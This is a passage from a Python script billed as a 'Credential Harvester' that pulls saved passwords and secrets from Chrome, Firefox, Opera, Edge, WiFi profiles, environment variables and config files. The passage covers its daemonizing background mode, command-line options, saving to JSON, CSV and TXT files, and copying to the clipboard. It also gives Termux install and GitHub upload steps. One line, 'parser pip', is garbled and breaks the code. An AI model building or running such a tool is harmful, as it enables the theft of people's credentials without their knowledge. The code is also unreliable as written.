                os.kill(pid, 0)
                return True
            except OSError:
                os.remove(pid_file)
                return False
        return False

    @staticmethod
    def stop():
        """Stop background instance"""
        pid_file = os.path.expanduser("~/cred_harv.pid")
        if os.path.exists(pid_file):
            with open(pid_file, 'r') as f:
                pid = int(f.read().strip())
            try:
                os.kill(pid, 15)  # SIGTERM
                os.remove(pid_file)
                print(f"{Colors.GREEN}[+] Background process stopped (PID: {pid}){Colors.RESET}")
                return True
            except OSError:
                print(f"{Colors.RED}[x] Process not found.{Colors.RESET}")
                os.remove(pid_file)
                return False
        else:
            print(f"{Colors.YELLOW}[!] No background process found.{Colors.RESET}")
            return False


# ============================================================
# MAIN EXECUTION
# ============================================================

def main():
    parser = argparse.ArgumentParser(
        description='Credential Harvester - Extract browser and system credentials',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 credential_harvester.py              # Run normally
  python3 credential_harvester.py --bg         # Run in background
  python3 credential_harvester.py --detailed    # Show detailed view
  python3 credential_harvester.py --save        # Save to files
  python3 credential_harvester.py --clipboard   # Copy to clipboard
  python3 credential_harvester.py --all          # All options
  python3 credential_harvester.py --stop         # Stop background process
  python3 credential_harvester.py --status       # Check status

GitHub Upload:
  1. git init
  2. git add credential_harvester.py
  3. git commit -m "Credential Harvester v1.0"
  4. git push origin main

Termux Setup:
  pkg update && pkg upgrade
  pkg install python python-pip git
  pip install pycryptodome  # Optional, for decryption
  git clone <your-repo>
  cd <your-repo>
  python3 credential_harvester.py --all
        """
    )

    parser.add_argument('--bg', '--background', action='store_true',
                        help='Run in background (daemonized)')
    parser.add_argument('--detailed', action='store_true',
                        help='Show detailed credential view')
    parser.add_argument('--save', action='store_true',
                        help='Save credentials to files (JSON, CSV, TXT)')
    parser pip
    parser.add_argument('--clipboard', action='store_true',
                        help='Copy credentials to clipboard')
    parser.add_argument('--all', action='store_true',
                        help='Enable all options')
    parser.add_argument('--stop', action='store_true',
                        help='Stop background process')
    parser.add_argument('--status', action='store_true',
                        help='Check background process status')
    parser.add_argument('--quiet', '-q', action='store_true',
                        help='Suppress banner output')

    args = parser.parse_args()

    # Handle stop command
    if args.stop:
        BackgroundManager.stop()
        return

    # Handle status command
    if args.status:
        if BackgroundManager.check_running():
            print(f"{Colors.GREEN}[+] Credential Harvester is running in background.{Colors.RESET}")
        else:
            print(f"{Colors.DIM}[-] No background process found.{Colors.RESET}")
        return

    # Check if already running
    if BackgroundManager.check_running() and not args.bg:
        print(f"{Colors.YELLOW}[!] Another instance is already running.{Colors.RESET}")
        print(f"{Colors.DIM}    Use --stop to kill it first.{Colors.RESET}")
        return

    # Handle background mode
    if args.bg:
        print(f"{Colors.CYAN}[*] Starting in background mode...{Colors.RESET}")
        if BackgroundManager.daemonize():
            # We're now in the daemon process
            pass
        else:
            # Parent process, exit
            print(f"{Colors.GREEN}[+] Daemon started. Check ~/cred_harv_daemon.log{Colors.RESET}")
            return

    # Enable all options
    if args.all:
        args.detailed = True
        args.save = True
        args.clipboard = True

    # Print banner
    if not args.quiet:
        OutputFormatter([]).print_banner()

    # Show extraction start
    print(f"{Colors.CYAN}[*] Starting credential extraction...{Colors.RESET}")
    print(f"{Colors.DIM}    Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{Colors.RESET}\n")

    # Extract credentials
    extractor = CredentialExtractor()
    credentials = extractor.extract_all()

    # Format and display results
    formatter = OutputFormatter(credentials)

    if args.detailed:
        formatter.print_detailed_view()
    else:
        formatter.print_credentials_table()

    # Save to files
    if args.save or args.all:
        formatter.save_to_file()

    # Copy to clipboard
    if args.clipboard or args.all:
        formatter.copy_to_clipboard()

    # Final summary
    print(f"\n{Colors.MAGENTA}{'='*64}{Colors.RESET}")
    print(f"{Colors.GREEN}{Colors.BOLD}[+] Extraction complete!{Colors.RESET}")
    print(f"{Colors.CYAN}    Total credentials found: {len(credentials)}{Colors.RESET}")
    print(f"{Colors.CYAN}    Sources checked: Chrome, Firefox, Opera, Edge, WiFi, Environment, Config{Colors.RESET}")
    print(f"{Colors.MAGENTA}{'='*64}{Colors.RESET}")

    # Cleanup PID file if daemon
    if args.bg:
        pid_file = os.path.expanduser("~/cred_harv.pid")
        if os.path.exists(pid_file):
            os.remove(pid_file)


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{Colors.YELLOW}[!] Interrupted by user.{Colors.RESET}")
        print(f"{Colors.DIM}    Cleaning up...{Colors.RESET}")
        pid_file = os.path.expanduser("~/cred_harv.pid")
        if os.path.exists(pid_file):
            os.remove(pid_file)
        sys.exit(0)
    except Exception as e:
        print(f"\n{Colors.RED}[x] Fatal error: {e}{Colors.RESET}")
        import traceback
        traceback.print_exc()
        sys.exit(1)